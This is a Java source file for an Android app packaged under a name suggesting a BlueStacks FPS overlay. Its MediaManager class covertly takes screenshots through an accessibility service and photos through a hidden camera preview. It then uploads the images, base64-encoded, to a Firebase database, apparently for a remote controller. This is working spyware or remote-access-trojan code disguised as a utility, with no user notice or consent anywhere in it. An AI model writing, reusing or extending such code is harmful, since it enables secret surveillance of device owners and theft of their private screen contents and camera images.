package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Base64;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;
import com.google.firebase.database.DatabaseReference;
import androidx.annotation.NonNull;
import java.io.ByteArrayOutputStream;
import java.util.List;

public class MediaManager {
    private final Context context;
    private final DatabaseReference dataRef;

    public MediaManager(Context context, DatabaseReference dataRef) {
        this.context = context;
        this.dataRef = dataRef;
    }

    public void takeScreenshotAction(AccessibilityService service) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            service.takeScreenshot(Display.DEFAULT_DISPLAY, context.getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull AccessibilityService.ScreenshotResult result) {
                    Bitmap bm = null;
                    HardwareBuffer hb = null;
                    try {
                        hb = result.getHardwareBuffer();
                        bm = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
                        if (bm != null) {
                            Bitmap swBm = bm.copy(Bitmap.Config.ARGB_8888, false);
                            dataRef.child("camera").removeValue();
                            sendImage("screenshot", swBm, 50);
                            swBm.recycle();
                        }
                    } catch (Exception ignored) {
                    } finally {
                        if (bm != null) bm.recycle();
                        if (hb != null) hb.close();
                    }
                }

                @Override
                public void onFailure(int e) {
                }
            });
        }
    }

    public void takeCameraAction(int camId) {
        new Thread(() -> {
            Camera cam = null;
            try {
                cam = Camera.open(camId);
                SurfaceTexture st = new SurfaceTexture(10);
                cam.setPreviewTexture(st);
                
                Camera.Parameters p = cam.getParameters();
                
                // Get best picture size
                List<Camera.Size> sizes = p.getSupportedPictureSizes();
                Camera.Size bestSize = sizes.get(0);
                for (Camera.Size s : sizes) {
                    if (s.width * s.height > bestSize.width * bestSize.height) {
                        bestSize = s;
                    }
                }
                p.setPictureSize(bestSize.width, bestSize.height);
                
                // Get matching preview size to avoid distortion
                List<Camera.Size> previewSizes = p.getSupportedPreviewSizes();
                Camera.Size bestPreview = previewSizes.get(0);
                float targetRatio = (float) bestSize.width / bestSize.height;
                for (Camera.Size s : previewSizes) {
                    if (Math.abs(((float) s.width / s.height) - targetRatio) < 0.1) {
                        bestPreview = s;
                        break;
                    }
                }
                p.setPreviewSize(bestPreview.width, bestPreview.height);

                // Set parameters (we rotate the bitmap manually later for better compatibility)
                cam.setParameters(p);
                cam.startPreview();
                
                // Give sensor time to adjust exposure/focus
                Thread.sleep(1000);
                
                cam.takePicture(null, null, (data, camera) -> {
                    try {
                        BitmapFactory.Options options = new BitmapFactory.Options();
                        options.inSampleSize = 2; // Initial compression
                        Bitmap bm = BitmapFactory.decodeByteArray(data, 0, data.length, options);
                        if (bm != null) {
                            // Calculate dynamic rotation based on device orientation
                            int rotation = calculateCameraRotation(camId);
                            if (rotation != 0) {
                                Matrix matrix = new Matrix();
                                matrix.postRotate(rotation);
                                Bitmap rotatedBm = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), matrix, true);
                                bm.recycle();
                                bm = rotatedBm;
                            }
                            
                            // Clear other type to avoid confusion in controller
                            dataRef.child("screenshot").removeValue();
                            sendImage("camera", bm, 70);
                            bm.recycle();
                        }
                    } catch (Exception ignored) {
                    } finally {
                        camera.release();
                    }
                });
            } catch (Exception e) {
                if (cam != null) {
                    try { cam.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private int calculateCameraRotation(int cameraId) {
        Camera.CameraInfo info = new Camera.CameraInfo();
        Camera.getCameraInfo(cameraId, info);
        
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        int displayRotation = windowManager.getDefaultDisplay().getRotation();
        int degrees = 0;
        switch (displayRotation) {
            case Surface.ROTATION_0: degrees = 0; break;
            case Surface.ROTATION_90: degrees = 90; break;
            case Surface.ROTATION_180: degrees = 180; break;
            case Surface.ROTATION_270: degrees = 270; break;
        }

        int result;
        if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
            result = (info.orientation + degrees) % 360;
            result = (360 - result) % 360;  // compensate the mirror
        } else {  // back-facing
            result = (info.orientation - degrees + 360) % 360;
        }
        return result;
    }

    public void sendImage(String type, Bitmap bm, int quality) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, quality, out);
        dataRef.child(type).setValue(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
    }
}
